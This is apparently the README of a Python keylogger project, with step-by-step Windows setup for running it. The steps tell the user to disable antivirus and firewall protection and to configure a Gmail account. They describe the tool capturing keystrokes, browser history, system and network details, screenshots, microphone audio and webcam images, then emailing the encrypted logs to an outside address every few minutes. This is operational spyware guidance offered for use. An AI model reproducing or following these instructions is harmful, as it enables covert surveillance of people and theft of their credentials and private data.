# python-keylogger

For Windows
-----------------
1. Disable all antivirus, (Windows Defender, Firewall, etc)
   -If the antivirus is not disabled you must not quarantine the program
2. Create a gmail (or use existing) and allow less secure app access
   -Log in to gmail
   -Manage your google account
   -Navigate to security panel on the left
   -Scroll down & Enable less secure app access
3. Requires Python 3.8+
https://www.python.org/downloads/
4. Edit your system environment variable paths to include your Python location
  -Open Settings
     -Search "View Advanced System Settings"
        -Click Environment Variables
            -Edit the user variables Path on the top to include the Python directory & Python script directories
            -Edit the user system paths on the bottom to include the Python directory
5. open cmd or terminal of your choice and download the following modules
   -pip install pynput
   -pip install pywin32
   -pip install browserhistory
   -pip install cv2
   -pip install numpy
   -pip install Image
   -pip install requests
   -pip install sounddevice
6. Open Python IDE of your choice (e.g. Pycharm)
7. Edit lines 88 & 89 of AdvancedKeylogger.py to include your email username & password
8. Run the AdvancedKeylogger.py
   - Wait a few minutes
9. Navigate to C:\Users\Public
10. a Logs folder will be generated C:\Users\Public\Logs with the network information, key log information, browser information, system information alongside all monitor screenshots, audio recordings, and camera screenshots
11. After a period of time ~ roughly 5 minutes all files will be sent towards the email of your choice. The text files will be encrypted
12. To decrypt the text files, put all the encrypted files back into the logs folder & run the decrypt.py program
  
